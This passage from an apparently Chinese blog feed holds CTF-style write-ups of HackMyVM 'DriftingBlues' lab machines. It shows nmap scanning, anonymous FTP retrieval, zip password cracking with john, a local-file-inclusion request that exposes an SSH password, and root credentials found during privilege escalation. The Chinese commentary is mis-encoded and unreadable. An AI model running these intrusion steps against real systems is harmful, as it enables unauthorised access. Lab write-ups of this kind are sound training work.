</span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=12     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=11     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=10     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=9      | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=8      | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=6      | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=4      | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=3      | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=2      | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=1      | /sbin/init </span><br><span class="line">2025/04/06 07:25:01 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=790    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:25:01 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=791    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:25:01 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=792    | /bin/sh -c /root/key.sh </span><br><span class="line">2025/04/06 07:25:01 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=793    | /bin/bash /root/key.sh </span><br><span class="line">2025/04/06 07:25:03 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=794    | </span><br><span class="line">^CExiting program<span class="built_in">..</span>. (interrupt)</span><br><span class="line">gill@driftingblues:/keyfolder$ ls</span><br><span class="line">fracturedocean	rootcreds.txt</span><br><span class="line">gill@driftingblues:/keyfolder$ cat rootcreds.txt </span><br><span class="line">root creds</span><br><span class="line"></span><br><span class="line">imjustdrifting31</span><br></pre></td></tr></table></figure></div>
<p>å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯ç¬¦åˆæ¡ä»¶çš„ï¼Œè¿è¡Œé‚£ä¸ªå®šæ—¶ä»»åŠ¡ä¹‹åï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¼šå‡ºç°ä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯rootçš„å¯†ç </p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºçš„ææƒåé¢çš„éƒ¨åˆ†å¤ªè·³è„±äº†ï¼Œä¸€èˆ¬æ€è·¯æ ¹æœ¬æƒ³ä¸åˆ°ï¼Œä¸çœ‹wpæ„Ÿè§‰æˆ‘æ°¸è¿œæƒ³ä¸åˆ°è¦åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢åˆ›å»ºæ–‡ä»¶ï¼Œè€Œä¸”è¿˜è¦åªèƒ½å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶</p>
<ul>
<li>wpscan å¾—åˆ°ç”¨æˆ·å</li>
<li>å­¦ä¹ cewlå­—å…¸å·¥å…·ï¼Œå­¦ä¹ è¿™ä¸ªå·¥å…·çš„å¸¸ç”¨å‚æ•°ï¼Œåœ¨å¤–å›½é¶æœºä¸Šå¸¸ç”¨</li>
<li>æœ‰æ˜æ˜¾ä¸åŒçš„å›¾ç‰‡çœ‹çœ‹å…¶ä¸­æœ‰æ²¡æœ‰å¤šä½™çš„ä¿¡æ¯</li>
<li>çŸ¥é“.kdbxæ–‡ä»¶ç±»å‹  å¯ä»¥ç”¨keepass2johnç ´è§£ ç”¨keepassxcå·¥å…·æ‰“å¼€</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Driftingblues</title>
    <url>/posts/50762.html</url>
    <content><![CDATA[<p>HMV-Driftingbluesé¶åœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ &#x2F; ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ &#x2F; ä¿¡æ¯æ”¶é›†</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.58.44             </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">08</span> <span class="number">21</span>:<span class="number">02</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.44</span>)</span><br><span class="line">Host is up (<span class="number">0.026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span> open  ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">| <span class="params">ftp-syst:</span> </span><br><span class="line">|   <span class="params">STAT:</span> </span><br><span class="line">| FTP server <span class="params">status:</span></span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">58.11</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="params">TYPE:</span> ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">1</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> <span class="operator">-</span> secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| <span class="params">ftp-anon:</span> Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_-rwxrwxrwx    <span class="number">1</span> <span class="number">0</span>        <span class="number">0</span>             <span class="number">471</span> Sep <span class="number">19</span>  <span class="number">2021</span> respectmydrip.zip [<span class="params">NSE:</span> writeable]</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">3072</span> <span class="number">9</span>e:bb:af:<span class="number">6</span>f:<span class="number">7</span>d:a7:<span class="number">9</span>d:<span class="number">65</span>:a1:b1:a1:be:<span class="number">91</span>:cd:<span class="number">04</span>:<span class="number">28</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> a3:d3:c0:b4:c5:f9:c0:<span class="number">6</span>c:e5:<span class="number">47</span>:<span class="number">64</span>:fe:<span class="number">91</span>:c5:cd:c0 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>c:<span class="number">84</span>:da:<span class="number">5</span>a:ff:<span class="number">04</span>:b9:b5:<span class="number">5</span>c:<span class="number">5</span>a:be:<span class="number">21</span>:b6:<span class="number">0</span>e:<span class="number">45</span>:<span class="number">73</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">2</span> disallowed entries </span><br><span class="line">|_<span class="symbol">/dripisreal.txt</span> <span class="symbol">/etc/dripispowerful.html</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OSs:</span> Unix, Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">26.10</span> ms bogon (<span class="number">192.168</span>.<span class="number">58.44</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">11.22</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾21 22 80<br>å…ˆå»åŒ¿åè®¿é—®ä¸€ä¸‹21ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ftp anonymous@192.168.58.44 </span><br><span class="line"></span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||27551|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Sep 19  2021 .</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Sep 19  2021 ..</span><br><span class="line">-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip</span><br><span class="line">ftp&gt; get respectmydrip.zip</span><br><span class="line">local: respectmydrip.zip remote: respectmydrip.zip</span><br><span class="line">229 Entering Extended Passive Mode (|||54209|)</span><br><span class="line">150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*|   471        2.46 MiB/s    00:00 ETA</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">226 Transfer complete.</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">471 bytes received in 00:00 (27.75 KiB/s)</span></span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æœ‰ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæ‹¿åˆ°æœ¬åœ°æ¥çœ‹çœ‹  æœ‰å¯†ç å°±ç”¨johnç ´è§£ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># unzip respectmydrip.zip                 </span></span><br><span class="line">Archive:  respectmydrip.<span class="built_in">zip</span></span><br><span class="line">[respectmydrip.<span class="built_in">zip</span>] respectmydrip.txt password: </span><br><span class="line">   skipping: respectmydrip.txt       incorrect password</span><br><span class="line">  inflating: secret.<span class="built_in">zip</span>              </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># zip2john respectmydrip.zip &gt; hash</span></span><br><span class="line">ver <span class="number">2.0</span> respectmydrip.<span class="built_in">zip</span>/respectmydrip.txt PKZIP Encr: cmplen=<span class="number">32</span>, decmplen=<span class="number">20</span>, crc=5C92F12B ts=96AB cs=5c92 <span class="built_in">type</span>=<span class="number">0</span></span><br><span class="line">ver <span class="number">2.0</span> respectmydrip.<span class="built_in">zip</span>/secret.<span class="built_in">zip</span> <span class="keyword">is</span> <span class="keyword">not</span> encrypted, <span class="keyword">or</span> stored <span class="keyword">with</span> non-handled compression <span class="built_in">type</span></span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># john hash                                            </span></span><br><span class="line">Using default <span class="built_in">input</span> encoding: UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password <span class="built_in">hash</span> (PKZIP [<span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C to abort, almost <span class="built_in">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> <span class="built_in">any</span>.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:/usr/share/john/password.lst</span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line">072528035        (respectmydrip.<span class="built_in">zip</span>/respectmydrip.txt)     </span><br><span class="line">1g <span class="number">0</span>:<span class="number">00</span>:01:<span class="number">44</span> DONE <span class="number">3</span>/<span class="number">3</span> (<span class="number">2025</span>-03-08 <span class="number">21</span>:09) <span class="number">0.009575</span>g/s 33407Kp/s 33407Kc/s 33407KC/s <span class="number">072238647.</span><span class="number">.078169144</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display <span class="built_in">all</span> of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">â”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# unzip respectmydrip.<span class="keyword">zip</span></span><br><span class="line">Archive:  respectmydrip.<span class="keyword">zip</span></span><br><span class="line">[respectmydrip.<span class="keyword">zip</span>] respectmydrip.txt password: </span><br><span class="line"> extracting: respectmydrip.txt       </span><br><span class="line"><span class="keyword">replace</span> secret.<span class="keyword">zip</span>? [y]es, [<span class="keyword">n</span>]o, [A]ll, [<span class="keyword">N</span>]<span class="keyword">one</span>, [r]ename: y</span><br><span class="line">  inflating: secret.<span class="keyword">zip</span>      </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">cat</span>  respectmydrip.txt      </span><br><span class="line">just focus <span class="keyword">on</span> <span class="string">&quot;drip&quot;</span>   </span><br></pre></td></tr></table></figure></div>

<p>ç»™äº†ä¸€ä¸ªâ€dripâ€æç¤ºï¼Œç„¶åè¿™ä¸ªsecret.zipä¹Ÿè¦å¯†ç ï¼Œdripä¸æ˜¯è¿™ä¸ªsecretçš„å¯†ç </p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl http://192.168.58.44/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;body&gt;</span></span><br><span class="line">driftingblues is hacked again so it&#x27;s now called drippingblues. :D hahaha</span><br><span class="line"><span class="variable">&lt;br&gt;</span></span><br><span class="line">by</span><br><span class="line"><span class="variable">&lt;br&gt;</span></span><br><span class="line">travisscott &amp; thugger</span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>ä»robots.txtä¸­å¾—åˆ°ä¸¤ä¸ªç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.58.44/robots.txt</span></span><br><span class="line"><span class="params">User-agent:</span> <span class="operator">*</span></span><br><span class="line"><span class="params">Disallow:</span> <span class="symbol">/dripisreal.txt</span></span><br><span class="line"><span class="params">Disallow:</span> <span class="operator">/</span>etc<span class="operator">/</span>dripispowerful.html</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.58.44//dripisreal.txt</span></span><br><span class="line">hello dear hacker wannabe,</span><br><span class="line"></span><br><span class="line">go <span class="keyword">for</span> this lyrics:</span><br><span class="line"></span><br><span class="line"><span class="keyword">https</span>://www.azlyrics.com/lyrics/youngthug/constantlyhating.html</span><br><span class="line"></span><br><span class="line">count <span class="keyword">the</span> n <span class="keyword">words</span> <span class="keyword">and</span> <span class="built_in">put</span> them side <span class="keyword">by</span> side <span class="keyword">then</span> md5sum <span class="keyword">it</span></span><br><span class="line"></span><br><span class="line">ie, hellohellohellohello &gt;&gt; md5sum hellohellohellohello</span><br><span class="line"></span><br><span class="line"><span class="keyword">it</span><span class="string">&#x27;s the password of ssh                                                                                                                                                        </span></span><br></pre></td></tr></table></figure></div>
<p>æŒ‰ç…§ä»–çš„è¯´æ³•å°±æ˜¯æŠŠè¿™ä¸ªæ­Œè¯é‡Œé¢æœ‰nçš„å•è¯éƒ½æå–å‡ºæ¥è®©åæ’åˆ—åœ¨ä¸€èµ·ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹grep â€œnâ€ å‘ç°å¸¦æœ‰nçš„å•è¯æ•°é‡å“äººï¼Œå°±å…ˆæ‰¾åˆ«çš„ä¿¡æ¯äº†<br>ç”¨gobusteræ‰«æçš„ç›®å½•ï¼Œå‘ç°é¦–é¡µæ˜¯index.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.58.44  -x php,js,txt,jpg,png</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.58.44</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,js,txt,jpg,png</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/index.php            (Status: 200) [Size: 138]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 78]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªphpæ–‡ä»¶ä¼šä¸ä¼šæœ‰ä»€ä¹ˆåé—¨å‘¢  ç”¨wfuzzæ‰«ä¸€ä¸‹æ²¡æœ‰æ‰«å‡ºæ¥ï¼Œä½†æ˜¯åˆšæ‰ftpæå–çš„æ–‡ä»¶é‡Œé¢æœ‰è¯´<code>just focus on &quot;drip&quot;  </code>æ‰€ä»¥ç”¨dripè¯•è¯•<br>ä½†æ˜¯æˆ‘ç”¨dripè¾“å…¥æŒ‡ä»¤å’Œæ–‡ä»¶ä»€ä¹ˆè¿”å›éƒ½æ²¡æœ‰<br><img src="https://pic1.imgdb.cn/item/67cc45d0066befcec6e15e39.png"><br>å¡ä½çœ‹äº†ä¸‹wpåï¼ŒåŸæ¥è¦è¯»å–åˆšæ‰robots.txté‡Œé¢ç»™çš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">view-source:http://192.168.58.44/index.php?drip=/etc/dripispowerful.html</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;drippin.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: Segoe;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;segoeui.ttf&#x27;</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.mainfo</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe&#x27;</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-top</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.emoji</span> &#123;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">width</span>: <span class="number">32px</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">password is:</span><br><span class="line">imdrippinbiatch</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">driftingblues is hacked again so it&#x27;s now called drippingblues. :D hahaha</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">by</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">travisscott &amp; thugger</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°å¯†ç <code>imdrippinbiatch</code> å°è¯•äº†å‡ ä¸ªç”¨æˆ·åï¼Œæœ€åç™»å½•åˆ°thuggerè¿™ä¸ªç”¨æˆ·äº†</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">thugger@drippingblues:~$ ls -al</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x<span class="number"> 14 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>root    root   <span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw------- <span class="number"> 1 </span>thugger thugger   <span class="number"> 8 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">drwxr-xr-x<span class="number"> 10 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.cache</span><br><span class="line">drwxr-xr-x<span class="number"> 11 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.config</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Desktop</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Documents</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Downloads</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.local</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Music</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Pictures</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Public</span><br><span class="line">drwx------ <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Templates</span><br><span class="line">-r-x------ <span class="number"> 1 </span>thugger thugger  <span class="number"> 32 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>user.txt</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Videos</span><br></pre></td></tr></table></figure></div>
